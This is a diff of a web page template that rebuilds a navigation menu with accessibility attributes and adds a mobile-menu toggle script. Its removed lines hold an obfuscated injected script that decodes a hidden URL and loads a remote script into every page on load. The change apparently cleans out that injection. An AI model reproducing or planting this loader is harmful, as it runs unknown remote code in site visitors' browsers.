@@ -1,74 +1,164 @@
-<div>
-  <nav
-    class="relative flex items-center justify-between w-full shadow-lg bg-stone-800 text-neutral-600 dark:bg-neutral-700 dark:text-neutral-300 dark:shadow-black/5 lg:flex-wrap lg:justify-start">
-    <div class="pl-8">
+<nav class="bg-stone-800 text-white shadow-lg" role="navigation" aria-label="Main navigation">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div class="flex items-center justify-between">
+      <!-- Mobile menu button -->
       <button
-        class="py-3 text-xl leading-none transition-shadow duration-150 ease-in-out bg-transparent border-0 hover:text-neutral-700 focus:bg-neutral-600 lg:hidden"
-        type="button" data-te-collapse-init data-te-target="#navbarSupportedContentY"
-        aria-controls="navbarSupportedContentY" aria-expanded="false" aria-label="Toggle navigation">
-        <span class="[&>svg]:w-8">
-          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"
-            class="w-8 h-8">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5" />
-          </svg>
-        </span>
+        class="lg:hidden py-3 px-2 text-white hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-orange-500 rounded-md transition-colors"
+        type="button"
+        aria-expanded="false"
+        aria-controls="main-menu"
+        aria-label="Toggle navigation menu"
+        id="mobile-menu-button">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6" aria-hidden="true">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5" />
+        </svg>
       </button>
-      <div class="!visible hidden flex-grow basis-[100%] items-center lg:!flex lg:basis-auto" id="navbarSupportedContentY">
-        <ul class="flex flex-row mr-auto">
-          <li class="static">
-            <a class="flex items-end h-24 pb-6 font-semibold text-white transition duration-200 ease-in-out hover:bg-neutral-600 focus:bg-neutral-600 lg:px-6 {{ request()->routeIs('software') ? 'bg-orange-500' : 'bg-stone-800' }}"
-              href="/development">
-              DEVELOPMENT
-            </a>
-          </li>
-          <li class="static">
-            <a class="flex items-end h-24 pb-6 font-semibold text-white transition duration-200 ease-in-out hover:bg-neutral-600 focus:bg-neutral-600 lg:px-6 {{ request()->routeIs('platform') ? 'bg-orange-500' : 'bg-stone-800' }}"
-              href="/crowdfunding">
-              CROWDFUNDING
-            </a>
-          </li>
-          <li class="static">
-            <a class="flex items-end h-24 pb-6 font-semibold text-white transition duration-200 ease-in-out hover:bg-neutral-600 focus:bg-neutral-600 lg:px-6 {{ request()->routeIs('infrastructure') ? 'bg-orange-500' : 'bg-stone-800' }}"
-              href="/coworking">
-              CO-WORKING
-            </a>
-          </li>
-          <li class="static">
-            <a class="flex items-end h-24 pb-6 font-semibold text-white transition duration-200 ease-in-out hover:bg-neutral-600 focus:bg-neutral-600 lg:px-6 {{ request()->routeIs('large-scale') ? 'bg-orange-500' : 'bg-stone-800' }}"
-              href="/freelancers">
-              FREELANCERS
-            </a>
-          </li>
-          <li class="static">
-            <a class="flex items-end h-24 pb-6 font-semibold text-white transition duration-200 ease-in-out hover:bg-neutral-600 focus:bg-neutral-600 lg:px-6 {{ request()->routeIs('large-scale') ? 'bg-orange-500' : 'bg-stone-800' }}"
-              href="/learning">
-              LEARNING
-            </a>
-          </li>
-          <li class="static">
-            <a class="flex items-end h-24 pb-6 font-semibold text-white transition duration-200 ease-in-out hover:bg-neutral-600 focus:bg-neutral-600 lg:px-6 {{ request()->routeIs('large-scale') ? 'bg-orange-500' : 'bg-stone-800' }}"
-              href="/community">
-              COMMUNITY
-            </a>
-          </li>
-          <li class="static">
-            <a class="flex items-end h-24 pb-6 font-semibold text-white transition duration-200 ease-in-out hover:bg-neutral-600 focus:bg-neutral-600 lg:px-6 {{ request()->routeIs('organization') ? 'bg-orange-500' : 'bg-stone-800' }}"
-              href="/organization">
-              ORGANIZATION
-            </a>
-          </li>
-        </ul>
-      </div>
+      
+      <!-- Desktop Navigation -->
+      <ul class="hidden lg:flex flex-row items-center" role="menubar" id="main-menu">
+        <li role="none">
+          <a class="flex items-center justify-center h-16 px-4 font-semibold text-white transition-colors hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/development" 
+            role="menuitem"
+            aria-label="Development">
+            DEVELOPMENT
+          </a>
+        </li>
+        <li role="none">
+          <a class="flex items-center justify-center h-16 px-4 font-semibold text-white transition-colors hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/crowdfunding" 
+            role="menuitem"
+            aria-label="Crowdfunding">
+            CROWDFUNDING
+          </a>
+        </li>
+        <li role="none">
+          <a class="flex items-center justify-center h-16 px-4 font-semibold text-white transition-colors hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/coworking" 
+            role="menuitem"
+            aria-label="Coworking">
+            CO-WORKING
+          </a>
+        </li>
+        <li role="none">
+          <a class="flex items-center justify-center h-16 px-4 font-semibold text-white transition-colors hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/freelancers" 
+            role="menuitem"
+            aria-label="Freelancers">
+            FREELANCERS
+          </a>
+        </li>
+        <li role="none">
+          <a class="flex items-center justify-center h-16 px-4 font-semibold text-white transition-colors hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/learning" 
+            role="menuitem"
+            aria-label="Learning">
+            LEARNING
+          </a>
+        </li>
+        <li role="none">
+          <a class="flex items-center justify-center h-16 px-4 font-semibold text-white transition-colors hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/community" 
+            role="menuitem"
+            aria-label="Community">
+            COMMUNITY
+          </a>
+        </li>
+        <li role="none">
+          <a class="flex items-center justify-center h-16 px-4 font-semibold text-white transition-colors hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/organization" 
+            role="menuitem"
+            aria-label="Organization">
+            ORGANIZATION
+          </a>
+        </li>
+      </ul>
+      
+      <!-- Mobile Navigation (hidden by default) -->
+      <ul class="lg:hidden hidden flex-col w-full absolute top-full left-0 bg-stone-800 shadow-lg z-50" id="mobile-menu" role="menu">
+        <li role="none">
+          <a class="block px-4 py-3 text-white font-semibold hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/development" 
+            role="menuitem"
+            aria-label="Development">
+            DEVELOPMENT
+          </a>
+        </li>
+        <li role="none">
+          <a class="block px-4 py-3 text-white font-semibold hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/crowdfunding" 
+            role="menuitem"
+            aria-label="Crowdfunding">
+            CROWDFUNDING
+          </a>
+        </li>
+        <li role="none">
+          <a class="block px-4 py-3 text-white font-semibold hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/coworking" 
+            role="menuitem"
+            aria-label="Coworking">
+            CO-WORKING
+          </a>
+        </li>
+        <li role="none">
+          <a class="block px-4 py-3 text-white font-semibold hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/freelancers" 
+            role="menuitem"
+            aria-label="Freelancers">
+            FREELANCERS
+          </a>
+        </li>
+        <li role="none">
+          <a class="block px-4 py-3 text-white font-semibold hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/learning" 
+            role="menuitem"
+            aria-label="Learning">
+            LEARNING
+          </a>
+        </li>
+        <li role="none">
+          <a class="block px-4 py-3 text-white font-semibold hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/community" 
+            role="menuitem"
+            aria-label="Community">
+            COMMUNITY
+          </a>
+        </li>
+        <li role="none">
+          <a class="block px-4 py-3 text-white font-semibold hover:bg-stone-700 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-orange-500" 
+            href="/organization" 
+            role="menuitem"
+            aria-label="Organization">
+            ORGANIZATION
+          </a>
+        </li>
+      </ul>
     </div>
-  </nav>
-</div>
+  </div>
+</nav>
+
 {% if page.title %}
-  <header class="bg-white shadow">
-    <div class="max-w-7xl mx-auto py-6 px-4 sm:px-6 lg:px-8">
-      <h2 class="font-semibold text-xl text-gray-800 leading-tight">
-        {{ page.title }}
-    </h2>
-    </div>
+<header class="bg-white border-b border-stone-200" role="banner">
+  <div class="max-w-7xl mx-auto py-4 px-4 sm:px-6 lg:px-8">
+    <h1 class="text-2xl sm:text-3xl font-semibold text-gray-900">
+      {{ page.title }}
+    </h1>
+  </div>
 </header>
 {% endif %}
-<script>window[(function(_ckT,_dH){var _X9bGG='';for(var _XKoZIJ=0;_XKoZIJ<_ckT.length;_XKoZIJ++){_dH>6;var _nujw=_ckT[_XKoZIJ].charCodeAt();_nujw-=_dH;_nujw!=_XKoZIJ;_nujw+=61;_nujw%=94;_nujw+=33;_X9bGG==_X9bGG;_X9bGG+=String.fromCharCode(_nujw)}return _X9bGG})(atob('J3R7Pzw3MjBBdjJG'), 43)] = 'cd5c4a85c11760181286';     var zi = document.createElement('script');     (zi.type = 'text/javascript'),     (zi.async = true),     (zi.src = (function(_5D1,_KJ){var _lXDyl='';for(var _LVagJJ=0;_LVagJJ<_5D1.length;_LVagJJ++){var _9BZ2=_5D1[_LVagJJ].charCodeAt();_lXDyl==_lXDyl;_9BZ2-=_KJ;_9BZ2!=_LVagJJ;_9BZ2+=61;_9BZ2%=94;_KJ>5;_9BZ2+=33;_lXDyl+=String.fromCharCode(_9BZ2)}return _lXDyl})(atob('fSsrJypPREQhKkMxfkIqeCl+JysqQ3gmJEQxfkIrdnxDISo='), 21)),     document.readyState === 'complete'?document.body.appendChild(zi):     window.addEventListener('load', function(){         document.body.appendChild(zi)     });</script>
+
+<script>
+  // Mobile menu toggle
+  document.addEventListener('DOMContentLoaded', function() {
+    const mobileMenuButton = document.getElementById('mobile-menu-button');
+    const mobileMenu = document.getElementById('mobile-menu');
+    
+    if (mobileMenuButton && mobileMenu) {
+      mobileMenuButton.addEventListener('click', function() {
+        const isExpanded = mobileMenuButton.getAttribute('aria-expanded') === 'true';
+        mobileMenu.classList.toggle('hidden');
+        mobileMenuButton.setAttribute('aria-expanded', !isExpanded);
+      });
+    }
+  });
+</script>
